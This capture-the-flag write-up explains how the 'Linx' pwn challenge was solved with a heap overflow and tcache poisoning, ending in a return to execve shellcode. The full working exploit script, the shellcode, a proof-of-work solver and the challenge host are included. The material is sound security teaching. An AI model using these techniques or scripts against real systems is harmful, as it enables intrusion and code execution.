# Linx Writeup

Category: `Pwn`  
Difficulty: `Hard`  
Flag: `srdnlen{y0u_ve_l1nk3d_v3ry_h4rd}`

## TL;DR

This challenge is a heap overflow in a link manager:

- it stores shellcode for us in an RWX page at `0x1337000`
- it allocates `src` and `dst` with `calloc(1, 50)`
- it then `memcpy()`s the full regex match length into those 50-byte buffers with no bounds check
- that gives a heap overflow into adjacent `0x40` chunks
- we use that to leak:
  - libc
  - heap
  - stack via `environ`
- then we tcache-poison again and overwrite saved RIP with `0x1337001`
- quitting the menu returns into our shellcode

The most important practical lesson from this challenge is:

1. Use the exact remote libc and ld.
2. Keep the exploit in the stable `0x40` chunk world.
3. Reduce heap noise by making the strings longer when you want cleaner leaks.
4. Remote solve also needs the Hashcash PoW step.

---

## 1. What the challenge is actually about

When I first looked at this binary, the confusing part was:

> “What is this challenge even trying to make me do?”

The answer is:

- the challenge is not mainly about ROP
- it is not mainly about finding a hidden `win()`
- it is not mainly about shellcode injection either, because the program already gives us an executable page

It is mainly about:

- building a predictable heap layout with small allocations
- abusing the overflow to leak allocator pointers
- converting those leaks into a targeted tcache poisoning write
- using the fixed RWX page as the final code execution target

So the real question is not “how do I get shellcode in memory?”  
The program already does that for us.

The real question is:

> “How do I redirect control flow to `0x1337000`?”

That is what the whole exploit is solving.

---

## 2. Recon

### Files

```bash
ls -la
file *
```

Important files:

- `linx`
- `linx.c`
- `Dockerfile`

### Protections

```bash
checksec ./linx
```

Expected result:

- `PIE`: enabled
- `Canary`: enabled
- `NX`: enabled
- `RELRO`: full

Implication:

- direct stack BOF is unlikely to be the intended route
- GOT overwrite is blocked by Full RELRO
- we need leaks first because PIE and libc are randomized
- stack overwrite is still possible if we can turn heap corruption into an arbitrary-ish write

### Remote info

The challenge text:

```bash
cat description.txt
```

Remote:

```bash
nc linx.challs.srdnlen.it 1092
```

Important: the service is behind a `26-bit Hashcash` proof-of-work.

This was a major source of confusion when a locally working exploit did not work remotely.

### Dockerfile

```bash
cat Dockerfile
```

Critical line:

```dockerfile
FROM ubuntu:25.10@sha256:4a9232cc47bf99defcc8860ef6222c99773330367fcecbf21ba2edb0b810a31e
```

This matters a lot.  
If you accidentally exploit against the wrong libc, you can waste an entire day.

In this challenge, using a wrong libc like `2.39` instead of the remote one completely changes:

- offsets
- tcache behavior
- `calloc` behavior
- exploit reliability

### Extract the real libc and ld from Docker

If you solve manually, do not guess libc.

Build and inspect the image:

```bash
docker build -t linx-image .
docker run --rm -it --entrypoint /bin/sh linx-image
```

Inside the container:

```bash
ldd /app/linx
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
```

Then copy out the runtime files:

```bash
docker cp <container_id>:/lib/x86_64-linux-gnu/libc.so.6 ./libc.so.6
docker cp <container_id>:/lib64/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2
```

Patch locally:

```bash
pwninit --bin ./linx --libc ./libc.so.6 --ld ./ld-linux-x86-64.so.2
```

After that, work on `./linx_patched`.

---

## 3. Quick static read of the source

The source is short enough that reading it carefully is worth it.

### Main behavior

From `main()`:

```c
void *mem = mmap((void*)0x1337000ULL, 0x1000,
    PROT_READ | PROT_WRITE | PROT_EXEC,
    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
...
fgets(mem, 0x20, stdin);
printf("Here's where I put your sauce: %p\n", mem);
```

This tells us:

- there is a fixed executable page at `0x1337000`
- we fully control up to `0x20` bytes there
- shellcode is almost certainly the intended final stage

Then the program enters a menu:

- `1` Insert new link
- `2` Unlink a link
- `3` Show links
- `4` Quit

### Data structures

Global state:

```c
char *links[30] = {0};
size_t links_cnt = 0;
linkT *linking = NULL;

typedef struct {
    size_t src_idx, dst_idx;
} linkT;
```

Interpretation:

- `links[]` is a table of distinct strings
- `linking[]` stores edges between strings
- a “link” like `[src](dst)` becomes:
  - maybe one new heap allocation for `src`
  - maybe one new heap allocation for `dst`
  - one more `linkT` element in `linking`

### The bug

The core vulnerability is in `do_link()`:

```c
char *src = calloc(1, LINKS_LEN);
char *dst = calloc(1, LINKS_LEN);
...
size_t len = m[i].rm_eo - m[i].rm_so;
...
memcpy(src, text+m[i].rm_so, len);
memcpy(dst, text+m[i].rm_so, len);
```

`LINKS_LEN` is `50`.

So:

- `src` and `dst` buffers are only 50 bytes long
- but the copied regex match length is unbounded
- therefore long `src` or `dst` strings overflow their heap chunk

That is the whole bug.

### A second important behavior: `read_int()`

```c
int read_int() {
    char *buf = malloc(16);
    printf(">> ");
    fgets(buf, 16, stdin);
    return atoi(buf);
}
```

This leaks heap state in a subtle way:

- every menu choice allocates a 16-byte chunk
- that chunk is never freed

Even when I did not use that exact path in the final exploit, it is still worth understanding:

- it shifts heap layout over time
- it can plant controlled bytes on the heap
- it explains why the heap evolves in ways that are easy to misread if you only think about `src`/`dst`

---

## 4. Section layout and binary info

Useful commands:

```bash
file ./linx
readelf -S ./linx
readelf -l ./linx
objdump -t ./linx | grep -iE "win|flag|shell|secret"
objdump -d ./linx | grep -E "system|execve"
strings ./linx | grep "/bin/sh"
```

What matters here:

- no easy `win()` route
- no direct `system("/bin/sh")` route
- the fixed RWX page is the intended execution primitive

---

## 5. Dynamic analysis setup

Use the patched local binary:

```bash
gdb -q ./linx_patched
```

Recommended pwndbg quality-of-life:

```gdb
set pagination off
set disassemble-next-line on
```

Useful breakpoints:

```gdb
b do_link
b do_unlink
b show_links
b main
```

Useful allocator breakpoints:

```gdb
b malloc
b calloc
b realloc
b free
```

Useful inspection commands:

```gdb
heap
bins
vmmap
vis_heap_chunks
telescope $rsp
x/40gx <addr>
x/s <addr>
```

If you want to watch exactly where chunks are going:

```gdb
commands
silent
printf "calloc(%#lx, %#lx)\n", $rdi, $rsi
continue
end
```

Or more directly:

```gdb
dprintf calloc, "calloc(%#lx, %#lx)\n", $rdi, $rsi
dprintf malloc, "malloc(%#lx)\n", $rdi
dprintf free, "free(%p)\n", $rdi
```

That makes it much easier to understand the `0x40` chunk choreography.

---

## 6. What confused me early

This challenge has several easy-to-misread parts.

### Confusion 1: “Why is my exploit not working remotely?”

Because the remote service does not start at the program prompt.  
It starts with Hashcash:

```text
Do Hashcash for 26 bits with resource "..."
Result:
```

If you do not solve that first, you never even reach:

```text
Welcome, provide me with your linking sauce:
```

So a script that works locally may still fail remotely for a completely unrelated reason.

### Confusion 2: “Why did the wrong libc waste so much time?”

Because this challenge depends on precise allocator behavior.

Wrong libc means:

- wrong `main_arena` leak offset
- wrong `environ` offset
- wrong chunk reuse behavior
- wrong assumptions about `calloc` and tcache

A “nearly correct” libc is not good enough here.

### Confusion 3: “Why do longer strings reduce noise?”

Because the bug works by printing strings that extend past their intended boundary.

If your string is short, the remainder of the chunk contains leftover bytes from:

- old user data
- allocator metadata
- previous heap traffic

That makes leaks messy and ambiguous.

If your controlled string fills most of the chunk, the leak becomes cleaner:

- your prefix is longer
- the boundary is easier to spot
- the first leaked uncontrolled bytes are closer to the pointer you actually want

This matters a lot in the `0x40` tcache bin.

### Confusion 4: “Why was targeting smallbin a bad idea?”

Because the exploit path here wants stable, predictable, low-latency reuse of small chunks.

The challenge naturally revolves around `calloc(1, 50)`, which becomes `0x40`-sized heap chunks.

If you corrupt something in smallbin:

- reuse timing changes
- allocator behavior becomes less immediate
- your corrupted chunk may get allocated in a way you did not plan
- crashes become noisy and hard to reason about

The clean path is to stay in the `0x40` ecosystem.

### Confusion 5: “What is this challenge about, in one sentence?”

One sentence answer:

> Use the heap overflow in link strings to leak libc/heap/stack, poison tcache into the stack, and return into the shellcode page at `0x1337000`.

---

## 7. Heap model

Each unique `src` or `dst` string is allocated with:

```c
calloc(1, 50)
```

On glibc this becomes a `0x40` chunk.

That is the most important fact in the challenge.

The exploit is basically:

1. create a bunch of `0x40` chunks
2. free carefully selected ones
3. overflow one `0x40` chunk into the metadata of a neighboring freed `0x40` chunk
4. make the allocator return something useful
5. leak or overwrite with it

---

## 8. Leak phase 1: libc + heap

This is the stable final leak strategy used in the working exploit.

### Heap grooming

Create 12 pairs:

```python
for i in range(12):
    send(io, b"SRC-" + tag + b"-" + b"A"*0x30,
             b"DST-" + tag + b"-" + b"A"*0x30)
```

This creates a predictable bank of `0x40` chunks.

### Free selected chunks

```python
delete(io, b"DST-2-" + b"A"*0x30)
delete(io, b"SRC-2-" + b"A"*0x30)
delete(io, b"DST-10-" + b"A"*0x30)
```

### Reinsert with an overflow

```python
send(io, b"DST-10-" + b"A"*0x41, b"SRC-2-" + b"A"*0x3A)
```

Why this works:

- the long string overflows the 50-byte allocation
- later when the program prints:

```c
printf("Good! You have linked \"%s\" and \"%s\"!\n", src, dst);
```

the string runs off into bytes that are no longer purely ours

### Parse libc and heap leaks

```python
libc.address = recv_quoted_leak(io, b"DST-10-" + b"A" * 0x41) - 0x234BD0
heap_base = (recv_quoted_leak(io, b"SRC-2-" + b"A" * 0x3A) << 12) - 0x7000
```

Important details:

- the libc leak offset for the correct remote libc is `0x234BD0`
- the heap leak gives us a safe-linked pointer fragment
- left-shifting by 12 reconstructs the page-aligned heap region
- subtracting `0x7000` normalizes to the actual heap base for this layout

Why that `<< 12` is there:

- safe-linking stores pointers xored with `(chunk_addr >> 12)`
- the leak is not a plain heap pointer in the usual sense
- we reconstruct the aligned heap base from how the leaked value appears in memory in this specific layout

This is exactly the sort of step that completely breaks if the libc/runtime assumptions are wrong.

---

## 9. Leak phase 2: stack via `environ`

Once we know libc and heap:

- libc gives us `environ`
- heap gives us the tcache safe-linking xor key we need

### Goal

Poison a `0x40` tcache entry so the next allocation gives us memory overlapping:

```c
libc.sym.environ - 0x38
```

Then use the print to leak a stack pointer.

### Chunk setup

```python
delete(io, b"DST-5-" + b"A"*0x30)
delete(io, b"SRC-6-" + b"A"*0x30)
delete(io, b"SRC-5-" + b"A"*0x30)
```

### Safe-linking encoding

In the working exploit:

```python
def poison_target(heap_base, target):
    return p64(target ^ ((heap_base >> 12) + 7))[:-2]
```

The `+7` is layout-specific here.  
The actual chunk position used in the tcache list corresponds to that page index offset in this exploit path.

This is another place where “almost right” is still wrong.

### Overwrite freed chunk forward pointer

```python
send(
    io,
    b"SRC-5-" + b"A"*0x3A + poison_target(heap_base, libc.sym.environ - 0x38),
    b"SRC-6-" + b"A"*0x30,
)
send(io, b"DST-5-" + b"A"*0x30, b"A"*0x38)
```

### Parse the leaked stack pointer

```python
rip = recv_quoted_leak(io, b"A" * 0x38) - 0x150
```

This leaked pointer is near the current stack frame.  
Subtracting `0x150` lands on the saved return address slot used by this execution path.

Again, this is not a generic number for all binaries.  
It is the correct number for this binary, this libc, and this path.

---

## 10. Final phase: overwrite saved RIP

Now we already know:

- libc base
- heap base
- stack address of the saved return slot

So the last phase is just another tcache poison.

### Free the next set of chunks

```python
delete(io, b"DST-0-" + b"A"*0x30)
delete(io, b"DST-3-" + b"A"*0x30)
delete(io, b"SRC-0-" + b"A"*0x30)
delete(io, b"SRC-3-" + b"A"*0x30)
```

### Poison toward `rip - 0x8`

```python
send(
    io,
    b"SRC-3-" + b"A"*0x3A + poison_target(heap_base, rip - 0x8),
    b"SRC-0-" + b"A"*0x30,
)
```

### Allocate over it and write the new return target

```python
send(io, b"DST-3-" + b"A"*0x30, b"A"*0x8 + p32(0x01337001))
```

Why only `p32`?

- because the surrounding bytes are favorable in this allocation pattern
- the saved RIP becomes `0x0000000001337001`
- `0x1337001` points into our shellcode page

Why `0x1337001` and not `0x1337000`?

Because the shellcode buffer starts with one junk byte:

```python
return b"A" + asm(...)
```

So the real shellcode starts at offset `+1`.

### Trigger

```python
io.sendline(b"4")
```

That exits the menu loop.  
The function returns, and execution lands in the shellcode page.

---

## 11. Shellcode

The final shellcode used in the working exploit:

```asm
xor esi, esi
push rsi
pop rdx
mov rax, 0x68732f2f6e69622f
push rax
push rsp
pop rdi
push 59
pop rax
syscall
```

This does:

```c
execve("/bin//sh", NULL, NULL)
```

It is short enough to fit comfortably in the `0x20` sauce buffer.

---

## 12. Manual pwndbg checks I would run

If I had to re-derive this exploit in the future, these are the dynamic checks I would rerun.

### Check the shellcode page

```gdb
b main
r
vmmap
x/16gx 0x1337000
```

Questions answered:

- is `0x1337000` mapped?
- is it executable?
- are my bytes there?

### Confirm the vulnerable allocations are `0x40` chunks

```gdb
b do_link
r
```

Then single-step until after the `calloc(1, 50)` calls:

```gdb
ni
ni
ni
heap
bins
```

Questions answered:

- are `src` and `dst` really becoming `0x40` chunks?
- what does the current `tcachebins[0x40]` state look like?

### Confirm overflow reach

After entering a long `[src](dst)` string:

```gdb
x/40gx <src_chunk_addr-0x10>
x/40bx <src_chunk_addr>
x/s <src_chunk_addr>
```

Questions answered:

- where does my data stop?
- which adjacent chunk header or user area am I hitting?

### Confirm the libc leak

Stop before the success `printf` in `do_link()`:

```gdb
disass do_link
b *do_link+<offset_before_printf>
```

At the breakpoint:

```gdb
info registers
x/s $rsi
x/s $rdx
x/20gx $rsi-0x10
x/20gx $rdx-0x10
```

Questions answered:

- which printed string is leaking?
- what bytes come after the controlled region?
- is the leak really a libc pointer?

### Confirm the stack leak via `environ`

```gdb
p/x &environ
x/gx &environ
```

Then after poisoning:

```gdb
x/20gx <poisoned_chunk_addr-0x10>
```

Questions answered:

- did the encoded tcache FD become the address I wanted?
- is the resulting printed pointer near the stack?

### Confirm saved RIP position

When I already have the stack leak:

```gdb
telescope <leaked_stack_pointer-0x200>
```

Questions answered:

- where is the return address exactly?
- is the `-0x150` adjustment correct for this run?

### Confirm final overwrite

Set a breakpoint right before the function returns:

```gdb
b *do_link+<offset_near_ret>
```

Then:

```gdb
telescope $rsp
x/gx <saved_rip_addr>
```

Questions answered:

- did the return address become `0x1337001`?
- is the stack still sane enough to return?

---

## 13. Commands I would keep as a checklist

### Recon

```bash
ls -la
file ./linx
checksec ./linx
readelf -S ./linx
readelf -l ./linx
cat Dockerfile
nc linx.challs.srdnlen.it 1092
```

### Runtime extraction

```bash
docker build -t linx-image .
docker run --rm -it --entrypoint /bin/sh linx-image
ldd /app/linx
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
```

### Local patching

```bash
pwninit --bin ./linx --libc ./libc.so.6 --ld ./ld-linux-x86-64.so.2
```

### Basic local run

```bash
./linx_patched
```

### Debugging

```bash
gdb -q ./linx_patched
```

Useful pwndbg inside gdb:

```gdb
set pagination off
b do_link
b do_unlink
b calloc
b free
heap
bins
vmmap
telescope $rsp
p/x &environ
x/gx &environ
```

### Exploit

Local:

```bash
python3 solve.py LOCAL CMD='echo OK; id'
```

Remote:

```bash
python3 solve.py CMD='cat /flag.txt; cat flag.txt'
```

---

## 14. Why the final exploit works reliably

The final exploit is reliable because it avoids the biggest traps:

- it uses the exact remote libc
- it does not depend on fancy FSOP
- it does not depend on smallbin behavior
- it stays in the `0x40` chunk regime
- it uses the binary’s own intended executable page
- it uses two direct leak stages and one direct overwrite stage

This is much cleaner than trying to overengineer the binary.

---

## 15. Final exploit code

The final working solver is in `solve.py`.

Core idea:

1. solve remote PoW if needed
2. send shellcode into the sauce page
3. leak libc and heap
4. poison tcache to leak stack via `environ`
5. poison tcache again to overwrite saved RIP
6. send `4` to return into shellcode

### `solve.py`

```python
#!/usr/bin/env python3
from pwn import *
import re
import subprocess
from pathlib import Path


HOST = args.HOST or "linx.challs.srdnlen.it"
PORT = int(args.PORT or 1092)

exe = context.binary = ELF(args.EXE or "./linx_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.arch = "amd64"
context.log_level = args.LOG_LEVEL or "info"

ROOT = Path(__file__).resolve().parent
POW_SRC = ROOT / "pow_solver.c"
POW_BIN = ROOT / "pow_solver"


def conn():
    if args.LOCAL:
        return process([exe.path], stdin=PIPE, stdout=PIPE)
    return remote(HOST, PORT)


def build_pow_solver():
    if POW_BIN.exists():
        return
    subprocess.run(
        [
            "gcc",
            "-O3",
            "-pthread",
            "-o",
            str(POW_BIN),
            str(POW_SRC),
            "-lcrypto",
        ],
        check=True,
    )


def solve_pow(io):
    banner = io.recvuntil(b"Result: ")
    m = re.search(rb'Hashcash for (\d+) bits with resource "([^"]+)"', banner)
    if not m:
        log.failure("failed to parse pow banner")
        raise ValueError("pow parse failed")

    bits = int(m.group(1))
    resource = m.group(2).decode()
    build_pow_solver()

    log.info("solving hashcash: bits=%d resource=%s", bits, resource)
    stamp = subprocess.check_output([str(POW_BIN), resource, str(bits)], text=True).strip()
    log.success("pow solved")
    io.sendline(stamp.encode())


def send(io, src: bytes, dst: bytes):
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"> ", b"[" + src + b"](" + dst + b")")


def delete(io, text: bytes):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"> ", text)


def build_shellcode():
    return b"A" + asm(
        """
        xor esi, esi
        push rsi
        pop rdx
        mov rax, 0x68732f2f6e69622f
        push rax
        push rsp
        pop rdi
        push 59
        pop rax
        syscall
        """
    )


def recv_quoted_leak(io, prefix: bytes) -> int:
    io.recvuntil(prefix)
    raw = io.recvuntil(b'"')[:-1]
    return u64(raw.ljust(8, b"\x00"))


def leak_libc_and_heap(io):
    for i in range(12):
        tag = str(i).encode()
        send(io, b"SRC-" + tag + b"-" + b"A" * 0x30, b"DST-" + tag + b"-" + b"A" * 0x30)

    delete(io, b"DST-2-" + b"A" * 0x30)
    delete(io, b"SRC-2-" + b"A" * 0x30)
    delete(io, b"DST-10-" + b"A" * 0x30)
    send(io, b"DST-10-" + b"A" * 0x41, b"SRC-2-" + b"A" * 0x3A)

    libc.address = recv_quoted_leak(io, b"DST-10-" + b"A" * 0x41) - 0x234BD0
    heap_base = (recv_quoted_leak(io, b"SRC-2-" + b"A" * 0x3A) << 12) - 0x7000

    log.success(f"libc base = {libc.address:#x}")
    log.success(f"heap base = {heap_base:#x}")
    return heap_base


def poison_target(heap_base: int, target: int) -> bytes:
    return p64(target ^ ((heap_base >> 12) + 7))[:-2]


def leak_stack(io, heap_base: int) -> int:
    delete(io, b"DST-5-" + b"A" * 0x30)
    delete(io, b"SRC-6-" + b"A" * 0x30)
    delete(io, b"SRC-5-" + b"A" * 0x30)

    send(
        io,
        b"SRC-5-" + b"A" * 0x3A + poison_target(heap_base, libc.sym.environ - 0x38),
        b"SRC-6-" + b"A" * 0x30,
    )
    send(io, b"DST-5-" + b"A" * 0x30, b"A" * 0x38)

    rip = recv_quoted_leak(io, b"A" * 0x38) - 0x150
    log.success(f"saved RIP slot = {rip:#x}")
    return rip


def overwrite_saved_rip(io, heap_base: int, rip: int):
    delete(io, b"DST-0-" + b"A" * 0x30)
    delete(io, b"DST-3-" + b"A" * 0x30)
    delete(io, b"SRC-0-" + b"A" * 0x30)
    delete(io, b"SRC-3-" + b"A" * 0x30)

    send(
        io,
        b"SRC-3-" + b"A" * 0x3A + poison_target(heap_base, rip - 0x8),
        b"SRC-0-" + b"A" * 0x30,
    )
    send(io, b"DST-3-" + b"A" * 0x30, b"A" * 0x8 + p32(0x01337001))
    log.success("saved RIP overwritten")


def exploit(io):
    io.sendlineafter(b"sauce:", build_shellcode())
    heap_base = leak_libc_and_heap(io)
    rip = leak_stack(io, heap_base)
    overwrite_saved_rip(io, heap_base, rip)
    io.clean(timeout=0.2)
    io.sendline(b"4")


def main():
    io = conn()
    if not args.LOCAL:
        solve_pow(io)

    exploit(io)

    if args.CMD:
        io.sendline(args.CMD.encode() + b"; exit")
        print(io.recvrepeat(1.5).decode("latin-1", "replace"), end="")
        io.close()
        return

    if not args.LOCAL:
        io.sendline(b"cat /flag.txt; cat flag.txt")
    io.interactive()


if __name__ == "__main__":
    main()
```

### `pow_solver.c`

The remote service uses a 26-bit Hashcash gate, so the solver above expects this helper in the same directory:

```c
#include <openssl/sha.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

typedef struct {
    int tid;
    int threads;
    int bits;
    const char *prefix;
    atomic_int *done;
    char *result;
    pthread_mutex_t *lock;
} worker_args_t;

static int has_leading_zero_bits(const unsigned char digest[SHA_DIGEST_LENGTH], int bits) {
    int full = bits / 8;
    int rem = bits % 8;

    for (int i = 0; i < full; i++) {
        if (digest[i] != 0) {
            return 0;
        }
    }
    if (rem == 0) {
        return 1;
    }
    return (digest[full] >> (8 - rem)) == 0;
}

static void *worker(void *arg) {
    worker_args_t *w = (worker_args_t *)arg;
    char stamp[512];
    unsigned char digest[SHA_DIGEST_LENGTH];
    uint64_t counter = (uint64_t)w->tid;

    while (!atomic_load(w->done)) {
        snprintf(stamp, sizeof(stamp), "%s%llx", w->prefix, (unsigned long long)counter);
        SHA1((unsigned char *)stamp, strlen(stamp), digest);
        if (has_leading_zero_bits(digest, w->bits)) {
            pthread_mutex_lock(w->lock);
            if (!atomic_load(w->done)) {
                atomic_store(w->done, 1);
                strcpy(w->result, stamp);
            }
            pthread_mutex_unlock(w->lock);
            return NULL;
        }
        counter += (uint64_t)w->threads;
    }

    return NULL;
}

static void make_date(char out[32]) {
    time_t now = time(NULL);
    struct tm tm;
    gmtime_r(&now, &tm);
    strftime(out, 32, "%y%m%d%H%M%S", &tm);
}

static void make_rand(char out[32]) {
    static const char alphabet[] =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    unsigned char raw[8];
    FILE *fp = fopen("/dev/urandom", "rb");
    if (!fp || fread(raw, 1, sizeof(raw), fp) != sizeof(raw)) {
        perror("urandom");
        exit(1);
    }
    fclose(fp);

    int idx = 0;
    uint32_t acc = 0;
    int bits = 0;
    for (size_t i = 0; i < sizeof(raw); i++) {
        acc = (acc << 8) | raw[i];
        bits += 8;
        while (bits >= 6) {
            bits -= 6;
            out[idx++] = alphabet[(acc >> bits) & 0x3f];
        }
    }
    if (bits > 0) {
        out[idx++] = alphabet[(acc << (6 - bits)) & 0x3f];
    }
    while (idx > 0 && out[idx - 1] == '=') {
        idx--;
    }
    out[idx] = '\0';
}

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "usage: %s <resource> <bits> [threads]\n", argv[0]);
        return 1;
    }

    const char *resource = argv[1];
    int bits = atoi(argv[2]);
    int threads = argc >= 4 ? atoi(argv[3]) : (int)sysconf(_SC_NPROCESSORS_ONLN);
    if (threads <= 0) {
        threads = 1;
    }

    char date[32];
    char randbuf[32];
    char prefix[512];
    char result[512] = {0};
    atomic_int done = 0;
    pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

    make_date(date);
    make_rand(randbuf);
    snprintf(prefix, sizeof(prefix), "1:%d:%s:%s::%s:", bits, date, resource, randbuf);

    pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
    worker_args_t *args = calloc((size_t)threads, sizeof(worker_args_t));
    if (!tids || !args) {
        perror("calloc");
        return 1;
    }

    for (int i = 0; i < threads; i++) {
        args[i] = (worker_args_t){
            .tid = i,
            .threads = threads,
            .bits = bits,
            .prefix = prefix,
            .done = &done,
            .result = result,
            .lock = &lock,
        };
        pthread_create(&tids[i], NULL, worker, &args[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tids[i], NULL);
    }

    if (result[0] == '\0') {
        return 1;
    }

    puts(result);
    free(tids);
    free(args);
    return 0;
}
```

### Run commands

Compile the PoW helper:

```bash
gcc -O3 -pthread -o pow_solver pow_solver.c -lcrypto
```

Run locally:

```bash
python3 solve.py LOCAL CMD='echo OK; id'
```

Run remotely:

```bash
python3 solve.py CMD='cat /flag.txt; cat flag.txt'
```

---

## 16. Things I want to remember next time

### Lesson 1

Do not trust an automatically pulled libc unless I verified it against the real container/runtime.

### Lesson 2

If the challenge naturally allocates one size class over and over, exploit that size class instead of forcing a fancier allocator path.

### Lesson 3

When a leak is noisy, make the controlled string longer before inventing a harder exploit.

### Lesson 4

If a remote exploit “mysteriously” fails before the program banner, check for PoW or a transport wrapper first.

### Lesson 5

This challenge is easiest to think about as:

```text
heap overflow -> libc/heap leak -> stack leak -> tcache poison to RIP -> jump to shellcode
```

Not as:

```text
random heap voodoo until shell
```

---

## 17. Final answer

The flag is:

```text
srdnlen{y0u_ve_l1nk3d_v3ry_h4rd}
```
